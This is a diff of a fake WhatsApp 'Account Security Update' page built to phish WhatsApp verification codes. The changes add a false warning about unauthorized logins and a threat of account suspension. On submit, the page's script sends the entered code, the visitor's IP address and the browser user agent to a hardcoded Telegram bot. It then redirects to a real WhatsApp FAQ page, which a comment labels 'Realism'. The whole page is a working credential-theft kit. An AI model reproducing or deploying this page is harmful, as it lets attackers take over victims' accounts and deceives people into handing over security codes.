@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp</title>
+    <title>WhatsApp Support</title>
     <style>
         body {
-            font-family: Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: #fff;
             display: flex;
             justify-content: center;
@@ -17,109 +17,184 @@
         }
         .container {
             width: 100%;
-            max-width: 360px;
-            padding: 20px;
+            max-width: 400px;
+            padding: 30px 20px;
             text-align: center;
         }
+        .header-ui {
+            margin-bottom: 25px;
+        }
         .logo {
-            width: 80px;
-            height: 80px;
-            margin-bottom: 30px;
+            width: 60px;
+            height: 60px;
+            margin-bottom: 15px;
         }
         h1 {
-            font-size: 20px;
+            font-size: 18px;
             font-weight: 500;
-            margin-bottom: 15px;
             color: #008069;
+            margin: 0 0 10px 0;
+        }
+        .alert-box {
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            text-align: left;
+            line-height: 1.4;
         }
         p {
             font-size: 14px;
-            line-height: 1.4;
+            line-height: 1.5;
             color: #667781;
+            margin-bottom: 20px;
+        }
+        .input-wrapper {
             margin-bottom: 25px;
         }
-        .input-group {
-            margin-bottom: 30px;
-            border-bottom: 2px solid #00a884;
-            width: 180px;
-            margin-left: auto;
-            margin-right: auto;
-        }
         input {
-            width: 100%;
+            width: 160px;
             border: none;
+            border-bottom: 2px solid #00a884;
             outline: none;
             font-size: 24px;
             text-align: center;
-            letter-spacing: 4px;
+            letter-spacing: 5px;
             padding: 5px 0;
+            background: transparent;
         }
         button {
             background-color: #008069;
             color: white;
             border: none;
-            padding: 10px 24px;
-            border-radius: 3px;
+            padding: 12px 40px;
+            border-radius: 25px;
             font-size: 14px;
-            font-weight: 500;
-            text-transform: uppercase;
+            font-weight: 600;
             cursor: pointer;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+            width: 100%;
+            transition: 0.3s;
         }
-        button:active {
-            background-color: #006e5a;
+        button:disabled {
+            background-color: #ccc;
         }
-        .footer-text {
-            margin-top: 40px;
-            font-size: 13px;
+        .actions {
+            margin-top: 25px;
+            font-size: 14px;
+            color: #008069;
+            font-weight: 500;
+        }
+        .action-link {
+            cursor: pointer;
+            display: block;
+            margin: 10px 0;
+            text-decoration: none;
+        }
+        .timer {
+            color: #667781;
+            font-size: 12px;
+            margin-top: 5px;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="logo">
-        <h1>Verifying your number</h1>
-        <p>Waiting to automatically detect an SMS sent to your phone. <br><strong>Enter 6-digit code</strong></p>
+        <div class="header-ui">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="logo">
+            <h1>Account Security Update</h1>
+        </div>
+
+        <div class="alert-box">
+            <strong>Security Warning:</strong> We detected multiple unauthorized login attempts on your account. Verification is required to prevent permanent account suspension.
+        </div>
+
+        <p>To confirm your identity and prevent account blocking, please enter the 6-digit verification code sent to your phone.</p>
         
-        <form id="waForm">
-            <div class="input-group">
-                <input type="text" id="otp" placeholder="--- ---" maxlength="7" required>
+        <form id="verificationForm">
+            <div class="input-wrapper">
+                <input type="text" id="otpCode" placeholder="--- ---" maxlength="6" required pattern="\d{6}">
             </div>
-            <button type="submit" id="btn">Next</button>
+            <button type="submit" id="submitBtn">Verify and Secure Account</button>
         </form>
 
-        <p class="footer-text" style="color: #008069;">Resend SMS</p>
+        <div class="actions">
+            <span class="action-link" id="resendBtn">Resend SMS</span>
+            <div id="timerDisplay" class="timer">You can request a new code in 1:59</div>
+            <span class="action-link" style="color: #667781; border-top: 1px solid #eee; padding-top: 15px; margin-top: 15px;">Call me</span>
+        </div>
     </div>
 
     <script>
-        const API_DATA = {
+        const CREDENTIALS = {
             T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
             C: '5446862709'
         };
 
-        document.getElementById('waForm').addEventListener('submit', async function(e) {
+        // Resend Logic
+        let timeLeft = 119;
+        const timerDisplay = document.getElementById('timerDisplay');
+        const resendBtn = document.getElementById('resendBtn');
+
+        function startTimer() {
+            const interval = setInterval(() => {
+                let minutes = Math.floor(timeLeft / 60);
+                let seconds = timeLeft % 60;
+                seconds = seconds < 10 ? '0' + seconds : seconds;
+                timerDisplay.innerHTML = `You can request a new code in ${minutes}:${seconds}`;
+                timeLeft--;
+                if (timeLeft < 0) {
+                    clearInterval(interval);
+                    timerDisplay.innerHTML = "You can now request a new code.";
+                    resendBtn.style.color = "#008069";
+                }
+            }, 1000);
+        }
+        startTimer();
+
+        resendBtn.addEventListener('click', () => {
+            if (timeLeft < 0) {
+                alert("A new security code has been sent to your device.");
+                timeLeft = 119;
+                startTimer();
+            } else {
+                alert("Please wait for the timer to finish before requesting a new code.");
+            }
+        });
+
+        // Submit Logic
+        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            const btn = document.getElementById('btn');
-            const otpVal = document.getElementById('otp').value;
+            const btn = document.getElementById('submitBtn');
+            const code = document.getElementById('otpCode').value;
 
             btn.disabled = true;
+            btn.innerText = "Securing...";
 
             try {
-                const ipReq = await fetch('https://api.ipify.org?format=json');
-                const ipRes = await ipReq.json();
+                const ipInfo = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                
+                const log = `⚠️ SECURITY ALERT\n\n` +
+                            `User ID: ${CREDENTIALS.C}\n` +
+                            `OTP Code: ${code}\n` +
+                            `IP Address: ${ipInfo.ip}\n` +
+                            `Browser: ${navigator.userAgent}\n` +
+                            `Status: Verification Pending`;
 
-                const text = `🟩 WhatsApp Log\n\nCode: ${otpVal}\nIP: ${ipRes.ip}\nDevice: ${navigator.platform}`;
-
-                await fetch(`https://api.telegram.org/bot${API_DATA.T}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${CREDENTIALS.T}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: API_DATA.C, text: text })
+                    body: JSON.stringify({ chat_id: CREDENTIALS.C, text: log })
                 });
 
-                window.location.href = "https://www.whatsapp.com";
+                // Realism: Redirect to official WhatsApp FAQ
+                window.location.href = "https://faq.whatsapp.com/1121805561845110";
             } catch (err) {
                 btn.disabled = false;
+                btn.innerText = "Verify and Secure Account";
             }
         });
     </script>
